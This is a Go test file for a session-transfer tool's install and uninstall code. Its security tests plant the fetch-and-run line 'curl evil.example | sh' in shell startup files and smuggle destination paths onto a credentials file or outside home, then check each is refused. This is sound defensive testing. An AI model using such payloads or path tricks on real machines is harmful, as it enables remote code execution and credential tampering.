package transfer

import (
	"bytes"
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/mithro/go-claude-teleport/internal/job"
	"github.com/mithro/go-claude-teleport/internal/session"
)

// staged builds two hosts, streams everything into staging and returns the
// dest Paths (config dir = <destHome>/.claude).
func staged(t *testing.T) (*Manifest, string, session.Paths) {
	t.Helper()
	m, staging := newTwoHosts(t)
	p := destPaths(t, m)
	st, _ := Diff(context.Background(), m, staging, p)
	var buf bytes.Buffer
	if err := Send(context.Background(), m, Need(m, st), &buf, nil); err != nil {
		t.Fatal(err)
	}
	if err := Receive(context.Background(), m, &buf, staging, nil); err != nil {
		t.Fatal(err)
	}
	return m, staging, p
}

func TestInstallFreshDestination(t *testing.T) {
	m, staging, p := staged(t)
	st, _ := Diff(context.Background(), m, staging, p)
	extra := InstallExtras{
		IndexEntry:   &session.IndexEntry{SessionID: sid, FullPath: m.Entries[1].Dst, ProjectPath: "/home/bob/work", FirstPrompt: "hello"},
		History:      []json.RawMessage{json.RawMessage(`{"display":"hi","timestamp":1,"project":"/home/bob/work","sessionId":"` + sid + `"}`)},
		ProjectCwd:   "/home/bob/work",
		ProjectEntry: session.ProjectEntry{"hasTrustDialogAccepted": true},
	}
	rep, err := Install(context.Background(), m, st, staging, p, extra)
	if err != nil {
		t.Fatal(err)
	}
	if rep.Installed != 5 || rep.FastForwarded != 0 || rep.SkippedSame != 0 {
		t.Errorf("report = %+v", rep)
	}
	if rep.IndexMerged != 1 || rep.HistoryAdded != 1 || !rep.ProjectEntryAdded {
		t.Errorf("merges = %+v", rep)
	}
	for _, e := range m.Entries {
		fi, err := os.Lstat(e.Dst)
		if err != nil {
			t.Errorf("%s not installed: %v", e.Dst, err)
			continue
		}
		if e.IsRegular() && fi.Mode().Perm() != os.FileMode(e.Mode).Perm() {
			t.Errorf("%s mode %v want %v", e.Dst, fi.Mode().Perm(), os.FileMode(e.Mode).Perm())
		}
		if e.IsRegular() && !fi.ModTime().Equal(e.ModTime) {
			t.Errorf("%s mtime %v want %v", e.Dst, fi.ModTime(), e.ModTime)
		}
	}
	parent, _ := os.Stat(filepath.Dir(m.Entries[3].Dst)) // todos/ created by Install
	if parent.Mode().Perm() != 0o700 {
		t.Errorf("session parent dir mode = %v, want 0700", parent.Mode().Perm())
	}
	if _, err := os.Stat(StagedPath(staging, 1)); !os.IsNotExist(err) {
		t.Errorf("staged copy must be moved, not copied")
	}
	idx, _ := os.ReadFile(filepath.Join(p.ProjectDir("/home/bob/work"), "sessions-index.json"))
	if !strings.Contains(string(idx), sid) {
		t.Errorf("sessions-index.json not merged: %s", idx)
	}
	hist, _ := os.ReadFile(p.HistoryFile())
	if !strings.Contains(string(hist), `"display":"hi"`) {
		t.Errorf("history not appended: %s", hist)
	}
	gj, _ := os.ReadFile(p.GlobalJSON)
	if !strings.Contains(string(gj), `"/home/bob/work"`) {
		t.Errorf("project entry not added: %s", gj)
	}

	// idempotent: a second Install after a fresh Diff is all present-same
	st, _ = Diff(context.Background(), m, staging, p)
	rep, err = Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err != nil || rep.SkippedSame != 5 || rep.Installed != 0 {
		t.Errorf("second install: rep=%+v err=%v", rep, err)
	}
}

func TestInstallFastForwardOverwritesOnlyPrefix(t *testing.T) {
	m, staging, p := staged(t)
	full, _ := os.ReadFile(StagedPath(staging, 1))
	// Controller ruling 1: the authoritative ff-check for a .jsonl Dst is
	// session.IsRecordPrefix (record-wise, not raw bytes), so the dest copy
	// must end on a record boundary to be a valid ff-candidate — truncate
	// after the first complete JSONL line, not at an arbitrary byte offset.
	nl := bytes.IndexByte(full, '\n')
	if nl < 0 || nl+1 >= len(full) {
		t.Fatalf("fixture transcript has no second record to fast-forward into: %q", full)
	}
	partial := full[:nl+1]
	os.MkdirAll(filepath.Dir(m.Entries[1].Dst), 0o700)
	os.WriteFile(m.Entries[1].Dst, partial, 0o600)
	st, _ := Diff(context.Background(), m, staging, p)
	if st[1] != FFCandidate {
		t.Fatalf("status = %s", st[1])
	}
	rep, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err != nil {
		t.Fatal(err)
	}
	if rep.FastForwarded != 1 {
		t.Errorf("report = %+v", rep)
	}
	got, _ := os.ReadFile(m.Entries[1].Dst)
	if !bytes.Equal(got, full) {
		t.Errorf("fast-forward did not replace the prefix")
	}
}

func TestInstallRefusesCollision(t *testing.T) {
	m, staging, p := staged(t)
	os.MkdirAll(filepath.Dir(m.Entries[3].Dst), 0o700)
	os.WriteFile(m.Entries[3].Dst, []byte("unrelated"), 0o600)
	st, _ := Diff(context.Background(), m, staging, p)
	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err == nil || !strings.Contains(err.Error(), m.Entries[3].Dst) || !strings.Contains(err.Error(), "present-different") {
		t.Fatalf("err = %v, want refusal naming the path", err)
	}
	got, _ := os.ReadFile(m.Entries[3].Dst)
	if string(got) != "unrelated" {
		t.Errorf("collision file was modified")
	}
	// entries before the collision were installed (idempotent), the rest untouched
	if _, err := os.Stat(m.Entries[1].Dst); err != nil {
		t.Errorf("entry 1 should have been installed before the stop: %v", err)
	}
	if _, err := os.Lstat(m.Entries[4].Dst); !os.IsNotExist(err) {
		t.Errorf("entry 4 must not be installed after the stop")
	}
}

func TestInstallRefusesNotStaged(t *testing.T) {
	m, staging, p := staged(t)
	os.Remove(StagedPath(staging, 2))
	st, _ := Diff(context.Background(), m, staging, p)
	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err == nil || !strings.Contains(err.Error(), "absent") {
		t.Fatalf("err = %v, want absent refusal", err)
	}
}

func TestInstallMemoryCopyIfAbsent(t *testing.T) {
	m, staging, p := staged(t)
	memSrc := filepath.Join(t.TempDir(), "memory.md")
	os.WriteFile(memSrc, []byte("# notes\n"), 0o600)
	memDst := filepath.Join(p.ConfigDir, "projects", "-home-bob-work", "memory", "MEMORY.md")
	mem := Entry{ID: 5, Category: session.CatSession, Src: memSrc, Dst: memDst, Size: 8, Mode: 0o600, SHA256: sha("# notes\n")}
	m.Entries = append(m.Entries, mem)
	writeFile(t, StagedPath(staging, 5), "# notes\n")
	st, _ := Diff(context.Background(), m, staging, p)
	rep, err := Install(context.Background(), m, st, staging, p, InstallExtras{Memory: []Entry{mem}})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.MemoryCopied) != 1 || rep.MemoryCopied[0] != memDst {
		t.Errorf("MemoryCopied = %v", rep.MemoryCopied)
	}
	// second run with different dest content: reported, not overwritten
	os.WriteFile(memDst, []byte("# edited locally\n"), 0o600)
	writeFile(t, StagedPath(staging, 5), "# notes\n")
	st, _ = Diff(context.Background(), m, staging, p)
	rep, err = Install(context.Background(), m, st, staging, p, InstallExtras{Memory: []Entry{mem}})
	if err != nil {
		t.Fatal(err)
	}
	if len(rep.MemoryDiffers) != 1 || rep.MemoryDiffers[0] != memDst {
		t.Errorf("MemoryDiffers = %v", rep.MemoryDiffers)
	}
	got, _ := os.ReadFile(memDst)
	if string(got) != "# edited locally\n" {
		t.Errorf("memory file overwritten")
	}
}

func TestInstallRefusesMemoryEntryWithMismatchedID(t *testing.T) {
	m, staging, p := staged(t)
	memSrc := filepath.Join(t.TempDir(), "memory.md")
	os.WriteFile(memSrc, []byte("# notes\n"), 0o600)
	memDst := filepath.Join(p.ConfigDir, "projects", "-home-bob-work", "memory", "MEMORY.md")
	mem := Entry{ID: 5, Category: session.CatSession, Src: memSrc, Dst: memDst, Size: 8, Mode: 0o600, SHA256: sha("# notes\n")}
	m.Entries = append(m.Entries, mem)
	writeFile(t, StagedPath(staging, 5), "# notes\n")
	st, _ := Diff(context.Background(), m, staging, p)

	// The Dst does not match manifest entry ID 5 (foreign/hand-built Entry
	// reusing an unrelated ID) — Install must refuse before touching disk.
	foreign := Entry{ID: 5, Category: session.CatSession, Src: memSrc, Dst: memDst + ".evil", Size: 8, Mode: 0o600, SHA256: sha("# notes\n")}
	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{Memory: []Entry{foreign}})
	if err == nil || !strings.Contains(err.Error(), "not a manifest entry") {
		t.Fatalf("err = %v, want refusal naming the mismatched memory entry", err)
	}
	if _, err := os.Stat(memDst); !os.IsNotExist(err) {
		t.Errorf("mismatched memory entry must not be installed")
	}

	// An ID that does not exist in the manifest at all is refused too.
	unknown := Entry{ID: 999, Category: session.CatSession, Src: memSrc, Dst: memDst, Size: 8, Mode: 0o600, SHA256: sha("# notes\n")}
	_, err = Install(context.Background(), m, st, staging, p, InstallExtras{Memory: []Entry{unknown}})
	if err == nil || !strings.Contains(err.Error(), "not a manifest entry") {
		t.Fatalf("err = %v, want refusal for unknown memory id", err)
	}
}

// TestInstallRefusesSmuggledCredentialsDst covers the defense-in-depth
// destination re-check (controller item 5): even though a well-behaved
// Build never emits a manifest entry inside session.Forbidden, Install must
// independently refuse one anyway — e.g. a manifest that smuggles a session
// entry's Dst into <ConfigDir>/.credentials.json — before touching disk.
func TestInstallRefusesSmuggledCredentialsDst(t *testing.T) {
	m, staging, p := staged(t)
	victim := 1 // the transcript entry: a plain session-category file
	if m.Entries[victim].Category != session.CatSession || m.Entries[victim].IsDir() {
		t.Fatalf("fixture entry %d is not a plain session file: %+v", victim, m.Entries[victim])
	}
	credPath := filepath.Join(p.ConfigDir, ".credentials.json")
	m.Entries[victim].Dst = credPath
	st, _ := Diff(context.Background(), m, staging, p)
	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err == nil || !strings.Contains(err.Error(), "forbidden") || !strings.Contains(err.Error(), credPath) {
		t.Fatalf("err = %v, want a forbidden-path refusal naming %s", err, credPath)
	}
	if _, statErr := os.Stat(credPath); !os.IsNotExist(statErr) {
		t.Errorf(".credentials.json must not have been written")
	}
	for i, e := range m.Entries {
		if i == victim || e.IsDir() {
			continue
		}
		if _, err := os.Lstat(e.Dst); err == nil {
			t.Errorf("entry %d (%s) must not have been installed before the smuggled entry was rejected", i, e.Dst)
		}
	}
}

// TestInstallRefusesDstOutsideHome covers the second half of the same
// defense-in-depth check: a Dst that lexically escapes p.Home altogether
// (any category, not just session) is refused before touching disk.
func TestInstallRefusesDstOutsideHome(t *testing.T) {
	m, staging, p := staged(t)
	victim := 3 // the todos/<sid>.json entry
	if m.Entries[victim].IsDir() {
		t.Fatalf("fixture entry %d is a dir, want a plain file", victim)
	}
	outside := filepath.Join(filepath.Dir(p.Home), "evil-outside", "payload.txt")
	m.Entries[victim].Dst = outside
	st, _ := Diff(context.Background(), m, staging, p)
	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err == nil || !strings.Contains(err.Error(), "not under home") || !strings.Contains(err.Error(), outside) {
		t.Fatalf("err = %v, want a not-under-home refusal naming %s", err, outside)
	}
	if _, statErr := os.Stat(outside); !os.IsNotExist(statErr) {
		t.Errorf("payload must not have been written outside home")
	}
}

// TestUninstallRefusesSmuggledCredentialsDst mirrors the Install case for
// Uninstall: a manifest entry whose Dst has been retargeted at
// <ConfigDir>/.credentials.json (with a matching hash, so nothing else
// would stop the removal) must be refused before anything is deleted —
// including the OTHER, legitimate entries the same manifest lists.
func TestUninstallRefusesSmuggledCredentialsDst(t *testing.T) {
	m, staging, p := staged(t)
	st, _ := Diff(context.Background(), m, staging, p)
	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
		t.Fatal(err)
	}
	credPath := filepath.Join(p.ConfigDir, ".credentials.json")
	os.WriteFile(credPath, []byte("super-secret"), 0o600)
	sum, _, err := HashFile(credPath)
	if err != nil {
		t.Fatal(err)
	}
	victim := 1
	m.Entries[victim].Dst = credPath
	m.Entries[victim].SHA256 = sum

	removed, err := Uninstall(m, p)
	if err == nil || !strings.Contains(err.Error(), "forbidden") || !strings.Contains(err.Error(), credPath) {
		t.Fatalf("err = %v removed = %v, want a forbidden-path refusal naming %s", err, removed, credPath)
	}
	if removed != nil {
		t.Errorf("nothing should have been removed: %v", removed)
	}
	if got, err := os.ReadFile(credPath); err != nil || string(got) != "super-secret" {
		t.Errorf(".credentials.json must survive untouched: %q err=%v", got, err)
	}
	for i, e := range m.Entries {
		if i == victim || e.IsDir() {
			continue
		}
		if _, err := os.Lstat(e.Dst); err != nil {
			t.Errorf("entry %d (%s) must not have been removed either: %v", i, e.Dst, err)
		}
	}
}

// TestUninstallRefusesDstOutsideHome mirrors the Install case: a manifest
// entry whose Dst lexically escapes p.Home is refused before any deletion.
func TestUninstallRefusesDstOutsideHome(t *testing.T) {
	m, staging, p := staged(t)
	st, _ := Diff(context.Background(), m, staging, p)
	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
		t.Fatal(err)
	}
	outside := filepath.Join(t.TempDir(), "payload.txt")
	if err := os.WriteFile(outside, []byte("x"), 0o600); err != nil {
		t.Fatal(err)
	}
	sum, _, err := HashFile(outside)
	if err != nil {
		t.Fatal(err)
	}
	victim := 3
	m.Entries[victim].Dst = outside
	m.Entries[victim].SHA256 = sum

	removed, err := Uninstall(m, p)
	if err == nil || !strings.Contains(err.Error(), "not under home") || !strings.Contains(err.Error(), outside) {
		t.Fatalf("err = %v removed = %v, want a not-under-home refusal naming %s", err, removed, outside)
	}
	if removed != nil {
		t.Errorf("nothing should have been removed: %v", removed)
	}
	if _, err := os.Stat(outside); err != nil {
		t.Errorf("payload outside home must survive untouched: %v", err)
	}
}

func TestUninstallRemovesOnlyMatching(t *testing.T) {
	m, staging, p := staged(t)
	st, _ := Diff(context.Background(), m, staging, p)
	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
		t.Fatal(err)
	}
	os.WriteFile(m.Entries[3].Dst, []byte("changed after install"), 0o600)
	removed, err := Uninstall(m, p)
	if err != nil {
		t.Fatal(err)
	}
	for _, r := range removed {
		if r == m.Entries[3].Dst {
			t.Errorf("modified file must not be removed")
		}
	}
	if _, err := os.Stat(m.Entries[3].Dst); err != nil {
		t.Errorf("modified file gone")
	}
	if _, err := os.Stat(m.Entries[1].Dst); !os.IsNotExist(err) {
		t.Errorf("matching transcript should be removed")
	}
	if _, err := os.Lstat(m.Entries[4].Dst); !os.IsNotExist(err) {
		t.Errorf("symlink should be removed")
	}
	if _, err := os.Stat(m.Entries[0].Dst); !os.IsNotExist(err) {
		t.Errorf("emptied project dir should be removed")
	}
}

// TestUninstallIDsOnlyNamedEntries covers Task 23 (abandon's
// destination-side deletion): UninstallIDs must restrict deletion to the
// given ids even when another, unnamed entry's current content also still
// matches the manifest hash.
func TestUninstallIDsOnlyNamedEntries(t *testing.T) {
	m, staging, p := staged(t)
	st, _ := Diff(context.Background(), m, staging, p)
	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
		t.Fatal(err)
	}
	removed, err := UninstallIDs(m, p, []int{m.Entries[1].ID})
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(m.Entries[1].Dst); !os.IsNotExist(err) {
		t.Errorf("named entry should be removed")
	}
	if _, err := os.Stat(m.Entries[3].Dst); err != nil {
		t.Errorf("entry not named in ids must survive: %v", err)
	}
	for _, r := range removed {
		if r == m.Entries[3].Dst {
			t.Errorf("unnamed entry must not be reported removed")
		}
	}
}

// TestUninstallIDsNeverRemovesDirNotInIDs is folded minor M1: a directory
// entry is a cleanup candidate only when its OWN id is in ids (i.e. the
// job itself created it) — never merely because every file under it also
// happened to be named. Here every non-dir entry is named, emptying the
// project directory, but its own id (0) is not — it must survive.
func TestUninstallIDsNeverRemovesDirNotInIDs(t *testing.T) {
	m, staging, p := staged(t)
	st, _ := Diff(context.Background(), m, staging, p)
	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
		t.Fatal(err)
	}
	var ids []int
	for _, e := range m.Entries {
		if !e.IsDir() {
			ids = append(ids, e.ID)
		}
	}
	if _, err := UninstallIDs(m, p, ids); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(m.Entries[0].Dst); err != nil {
		t.Errorf("directory whose id is not in ids must survive even once empty: %v", err)
	}
}

// TestUninstallRemovesEmptiedNestedDirs covers controller ruling 2: a
// manifest whose dir entries include a nested "<sid>/subagents/" tree must
// leave no empty directories behind once every file under it is removed —
// Uninstall has to walk the manifest's dir entries deepest-first, not just
// the top-level project dir.
func TestUninstallRemovesEmptiedNestedDirs(t *testing.T) {
	m, staging, p := staged(t)
	st, _ := Diff(context.Background(), m, staging, p)
	if _, err := Install(context.Background(), m, st, staging, p, InstallExtras{}); err != nil {
		t.Fatal(err)
	}
	// entry 2 is proj/<sid>/subagents/agent-1.jsonl; its parent dirs
	// (proj/<sid>/subagents and proj/<sid>) are not manifest dir entries
	// themselves, but the sidecar structure must not leave empties behind
	// when everything manifest-listed under proj/ is removed.
	sidecarSubagents := filepath.Dir(m.Entries[2].Dst)
	sidecarDir := filepath.Dir(sidecarSubagents)
	if _, err := os.Stat(sidecarSubagents); err != nil {
		t.Fatalf("fixture missing sidecar subagents dir: %v", err)
	}
	removed, err := Uninstall(m, p)
	if err != nil {
		t.Fatalf("removed=%v err=%v", removed, err)
	}
	if _, err := os.Stat(m.Entries[0].Dst); !os.IsNotExist(err) {
		t.Errorf("project dir (manifest entry 0) should be removed, leaving no empty tree: %v", err)
	}
	if _, err := os.Stat(sidecarDir); !os.IsNotExist(err) {
		t.Errorf("sidecar dir left behind: %v", err)
	}
}

// TestInstallRefusesSmuggledDeferredEntry is the Install half of B1: even
// with a status map that says staged-same (a compromised source could get
// there via a peer whose Diff is older, or simply by a bug), Install must
// refuse to place a Deferred entry whose category is not the pane capture
// — the only Deferred category the plain file-install path ever handles —
// before anything at all is touched. Since R-P3-B1c, a CatPack entry (used
// here, as the original B1 pin) is additionally refused at the
// category level by validateDst itself, regardless of Deferred — see
// TestInstallRefusesPackEntryEvenWithHostileStatusMap for that check
// pinned directly (including the absent-target PoC case this test does not
// cover); Deferred:true is kept here only as an unrelated regression check
// that the two refusals do not interfere with each other.
func TestInstallRefusesSmuggledDeferredEntry(t *testing.T) {
	m, staging, p := staged(t)
	victim := 2 // a plain session-category file
	if !m.Entries[victim].IsRegular() {
		t.Fatalf("fixture entry %d is not a plain file: %+v", victim, m.Entries[victim])
	}
	if err := os.MkdirAll(p.Home, 0o700); err != nil {
		t.Fatal(err)
	}
	bashrc := filepath.Join(p.Home, ".bashrc")
	rc := "# the user's own shell rc\n"
	if err := os.WriteFile(bashrc, []byte(rc), 0o600); err != nil {
		t.Fatal(err)
	}
	m.Entries[victim].Category = session.CatPack
	m.Entries[victim].Dst = bashrc
	m.Entries[victim].Deferred = true

	// The hostile status map the destination must not trust.
	st := map[int]Status{}
	for _, e := range m.Entries {
		st[e.ID] = StagedSame
	}
	_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err == nil || !strings.Contains(err.Error(), "pack") || !strings.Contains(err.Error(), bashrc) {
		t.Fatalf("err = %v, want a pack-entry refusal naming %s", err, bashrc)
	}
	if got, _ := os.ReadFile(bashrc); string(got) != rc {
		t.Errorf("%s was modified: %q", bashrc, got)
	}
	for i, e := range m.Entries {
		if i == victim || e.IsDir() {
			continue
		}
		if _, err := os.Lstat(e.Dst); err == nil {
			t.Errorf("entry %d (%s) must not have been installed before the smuggled entry was rejected", i, e.Dst)
		}
	}
}

// TestInstallForceOverwritesDivergedSessionFile covers B12. Spec §7.3:
// --force extends the fast-forward exception to the NON-prefix case, for
// the same session id only. Diff classifies such an entry
// present-different; Blocking(force=true) lets it through and Pending
// reports nothing outstanding, so preflight and the transfer step both say
// "go" — but Install's switch had no present-different arm and failed the
// whole job at step 8. It must overwrite instead, from a hash-verified
// staged copy, and only with the caller's explicit consent.
func TestInstallForceOverwritesDivergedSessionFile(t *testing.T) {
	setup := func(t *testing.T) (*Manifest, string, session.Paths, map[int]Status, []byte) {
		t.Helper()
		m, staging, p := staged(t)
		full, err := os.ReadFile(StagedPath(staging, 1))
		if err != nil {
			t.Fatal(err)
		}
		if !m.Entries[1].FFAllowed {
			t.Fatalf("fixture entry 1 is not a session file: %+v", m.Entries[1])
		}
		// A diverged transcript: same session, but NOT a prefix of the
		// incoming one, so no fast-forward is possible.
		os.MkdirAll(filepath.Dir(m.Entries[1].Dst), 0o700)
		if err := os.WriteFile(m.Entries[1].Dst, []byte(`{"type":"user","text":"a different branch of history"}`+"\n"), 0o600); err != nil {
			t.Fatal(err)
		}
		st, err := Diff(context.Background(), m, staging, p)
		if err != nil {
			t.Fatal(err)
		}
		if st[1] != PresentDifferent {
			t.Fatalf("status = %s, want %s", st[1], PresentDifferent)
		}
		if b := Blocking(m, st, true); len(b) != 0 {
			t.Fatalf("Blocking(force) = %+v, want nothing (this is the case --force allows)", b)
		}
		if ids := Pending(m, st); len(ids) != 0 {
			t.Fatalf("Pending = %v, want nothing outstanding", ids)
		}
		return m, staging, p, st, full
	}

	t.Run("with force", func(t *testing.T) {
		m, staging, p, st, full := setup(t)
		rep, err := Install(context.Background(), m, st, staging, p, InstallExtras{Force: true})
		if err != nil {
			t.Fatalf("Install: %v", err)
		}
		if rep.ForceOverwritten != 1 {
			t.Errorf("report = %+v, want ForceOverwritten 1", rep)
		}
		got, _ := os.ReadFile(m.Entries[1].Dst)
		if !bytes.Equal(got, full) {
			t.Errorf("destination not overwritten with the incoming copy")
		}
		for _, id := range rep.InstalledIDs {
			if id == 1 {
				t.Errorf("a force-overwritten entry pre-existed on the destination and must not be in InstalledIDs")
			}
		}
	})

	t.Run("without force", func(t *testing.T) {
		m, staging, p, st, _ := setup(t)
		_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
		if err == nil || !strings.Contains(err.Error(), "present-different") {
			t.Fatalf("err = %v, want a refusal naming the status", err)
		}
	})

	t.Run("force does not extend to another session's file", func(t *testing.T) {
		m, staging, p, st, _ := setup(t)
		// FFAllowed is a SOURCE-computed field; the destination must
		// re-derive session ownership from Dst itself.
		m.SessionID = "00000000-0000-4000-8000-000000000000"
		_, err := Install(context.Background(), m, st, staging, p, InstallExtras{Force: true})
		if err == nil || !strings.Contains(err.Error(), m.Entries[1].Dst) {
			t.Fatalf("err = %v, want a refusal naming %s", err, m.Entries[1].Dst)
		}
	})
}

// TestInstallRefusesSmuggledCaptureDst is the full end-to-end PoC for
// ruling R-P3-B1b (the wave B re-review's residual B1 finding): a hostile
// or buggy source builds a manifest with a Deferred CatCapture entry whose
// Dst is ~/.bashrc, staging attacker-controlled bytes under that entry's
// id. Before this fix, Diff's Deferred branch skipped the Lstat of Dst
// entirely (classifying staged-same) and Install's "only capture may be
// deferred" gate let CatCapture straight through, so placeEntry renamed the
// staged bytes over ~/.bashrc. The destination now re-derives the ONE
// legitimate capture Dst for this job — job.Dir(DataDir, jobID)/capture.txt
// — and refuses anything else in both Diff and Install, leaving ~/.bashrc
// byte-identical and naming the offending entry in the error.
func TestInstallRefusesSmuggledCaptureDst(t *testing.T) {
	home := t.TempDir()
	if err := os.MkdirAll(home, 0o700); err != nil {
		t.Fatal(err)
	}
	dataDir := filepath.Join(home, ".local", "share", "claude-teleport")
	p := session.Paths{
		Home:       home,
		ConfigDir:  filepath.Join(home, ".claude"),
		GlobalJSON: filepath.Join(home, ".claude.json"),
		DataDir:    dataDir,
	}
	jobID := "22222222-2222-4222-8222-222222222222"
	staging := job.StagingDir(dataDir, jobID)

	bashrc := filepath.Join(home, ".bashrc")
	rc := "# the user's own shell rc\n"
	if err := os.WriteFile(bashrc, []byte(rc), 0o600); err != nil {
		t.Fatal(err)
	}
	payload := "curl evil.example | sh\n"

	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid}
	m.Entries = []Entry{{
		ID: 0, Category: session.CatCapture, Dst: bashrc,
		Size: int64(len(payload)), Mode: 0o600, SHA256: sha(payload), Deferred: true,
	}}
	writeFile(t, StagedPath(staging, 0), payload)

	// R-P3-B1e item 5: Diff refuses the entry outright (it is a refusal
	// with a reason, not a content collision) and Install re-derives the
	// same verdict independently — installOrRefuse runs both.
	if _, err := Diff(context.Background(), m, staging, p); !IsRefusal(err) {
		t.Fatalf("Diff err = %v, want a refusal of the smuggled capture entry", err)
	}
	err := installOrRefuse(t, m, staging, p)
	if err == nil || !strings.Contains(err.Error(), bashrc) {
		t.Fatalf("err = %v, want a refusal naming %s", err, bashrc)
	}
	got, err := os.ReadFile(bashrc)
	if err != nil || string(got) != rc {
		t.Fatalf("%s must survive byte-identical: got %q err=%v", bashrc, got, err)
	}
}

// TestInstallRefusesCaptureDstEvenWithHostileStatusMap is Install's own
// independent half of the same defense (mirrors
// TestInstallRefusesSmuggledDeferredEntry): even a hostile status map that
// claims staged-same for every entry — bypassing Diff's own refusal
// entirely — must not get a CatCapture entry with a non-canonical Dst
// installed. Covered for both Deferred and non-Deferred entries: the
// canonical-Dst check in validateDst does not depend on the flag.
func TestInstallRefusesCaptureDstEvenWithHostileStatusMap(t *testing.T) {
	for _, deferred := range []bool{true, false} {
		t.Run(map[bool]string{true: "deferred", false: "not deferred"}[deferred], func(t *testing.T) {
			m, staging, p := staged(t)
			victim := 2 // a plain session-category file, repurposed as the attack entry
			if !m.Entries[victim].IsRegular() {
				t.Fatalf("fixture entry %d is not a plain file: %+v", victim, m.Entries[victim])
			}
			if err := os.MkdirAll(p.Home, 0o700); err != nil {
				t.Fatal(err)
			}
			bashrc := filepath.Join(p.Home, ".bashrc")
			rc := "# the user's own shell rc\n"
			if err := os.WriteFile(bashrc, []byte(rc), 0o600); err != nil {
				t.Fatal(err)
			}
			m.Entries[victim].Category = session.CatCapture
			m.Entries[victim].Dst = bashrc
			m.Entries[victim].Deferred = deferred

			st := map[int]Status{}
			for _, e := range m.Entries {
				st[e.ID] = StagedSame
			}
			_, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
			if err == nil || !strings.Contains(err.Error(), bashrc) || !strings.Contains(err.Error(), "capture") {
				t.Fatalf("err = %v, want a capture-entry refusal naming %s", err, bashrc)
			}
			got, _ := os.ReadFile(bashrc)
			if string(got) != rc {
				t.Errorf("%s was modified: %q", bashrc, got)
			}
		})
	}
}

// TestInstallInstallsCanonicalCaptureEntry proves the fix does not break
// the legitimate flow end-to-end: a manifest whose CatCapture entry's Dst
// IS job.Dir(DataDir, jobID)/capture.txt installs normally via Diff+Install
// (the plain file-install path, judged only against staging, per Entry's
// own doc comment).
func TestInstallInstallsCanonicalCaptureEntry(t *testing.T) {
	home := t.TempDir()
	dataDir := filepath.Join(home, ".local", "share", "claude-teleport")
	p := session.Paths{
		Home:       home,
		ConfigDir:  filepath.Join(home, ".claude"),
		GlobalJSON: filepath.Join(home, ".claude.json"),
		DataDir:    dataDir,
	}
	jobID := "44444444-4444-4444-8444-444444444444"
	staging := job.StagingDir(dataDir, jobID)
	capDst := filepath.Join(job.Dir(dataDir, jobID), "capture.txt")
	payload := "$ claude\n> hello\n"

	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid}
	m.Entries = []Entry{{
		ID: 0, Category: session.CatCapture, Dst: capDst,
		Size: int64(len(payload)), Mode: 0o600, SHA256: sha(payload), Deferred: true,
	}}
	writeFile(t, StagedPath(staging, 0), payload)

	st, err := Diff(context.Background(), m, staging, p)
	if err != nil {
		t.Fatal(err)
	}
	if st[0] != StagedSame {
		t.Fatalf("status = %s, want %s", st[0], StagedSame)
	}
	rep, err := Install(context.Background(), m, st, staging, p, InstallExtras{})
	if err != nil {
		t.Fatalf("Install: %v", err)
	}
	if rep.Installed != 1 {
		t.Errorf("report = %+v, want Installed 1", rep)
	}
	got, err := os.ReadFile(capDst)
	if err != nil || string(got) != payload {
		t.Fatalf("capture.txt not installed correctly: got %q err=%v", got, err)
	}
}

// TestInstallRefusesPackEntryAbsentTargetPoC is the wave-B re-review's PoC
// for ruling R-P3-B1c, run end to end through the real Diff()+Install()
// pair a production caller (internal/remote/local.go) actually uses: a
// manifest entry with category "pack" and Dst $HOME/.bash_profile — a path
// that does not exist yet on the destination — with attacker-chosen bytes
// staged under its id. Before this fix, Diff's ordinary "absent" branch
// classified it staged-same purely from staging state (no category check,
// no Lstat-based collision to catch it, since there is nothing to collide
// with), and Install's placeEntry created the file, landing arbitrary
// attacker content at a path a real login shell sources (the reviewer's
// code-exec-on-next-login finding). No FileEntry in this codebase is ever
// built with category "pack" (BuildManifest/gitx.Files never emit one; the
// git pack itself is the separate StreamPack, consumed straight into
// gitx.Attach), so it must be refused unconditionally and nothing may be
// created at Dst.
func TestInstallRefusesPackEntryAbsentTargetPoC(t *testing.T) {
	home := t.TempDir()
	dataDir := filepath.Join(home, ".local", "share", "claude-teleport")
	p := session.Paths{
		Home:       home,
		ConfigDir:  filepath.Join(home, ".claude"),
		GlobalJSON: filepath.Join(home, ".claude.json"),
		DataDir:    dataDir,
	}
	jobID := "33333333-3333-4333-8333-333333333333"
	staging := job.StagingDir(dataDir, jobID)
	target := filepath.Join(home, ".bash_profile") // absent: never written before this call
	payload := "curl evil.example | sh\n"

	m := &Manifest{Version: 1, JobID: jobID, SessionID: sid}
	m.Entries = []Entry{{
		ID: 0, Category: session.CatPack, Dst: target,
		Size: int64(len(payload)), Mode: 0o600, SHA256: sha(payload),
	}}
	writeFile(t, StagedPath(staging, 0), payload)

	if _, err := Diff(context.Background(), m, staging, p); !IsRefusal(err) {
		t.Fatalf("Diff err = %v, want a refusal of the pack entry", err)
	}
	err := installOrRefuse(t, m, staging, p)
	if err == nil || !strings.Contains(err.Error(), target) {
		t.Fatalf("err = %v, want a refusal naming %s", err, target)
	}
	if _, err := os.Lstat(target); !os.IsNotExist(err) {
		t.Errorf("%s must not have been created: lstat err = %v", target, err)
	}
}

// TestInstallRefusesPackEntryEvenWithHostileStatusMap is Install's own
// independent half of the same defense (mirrors
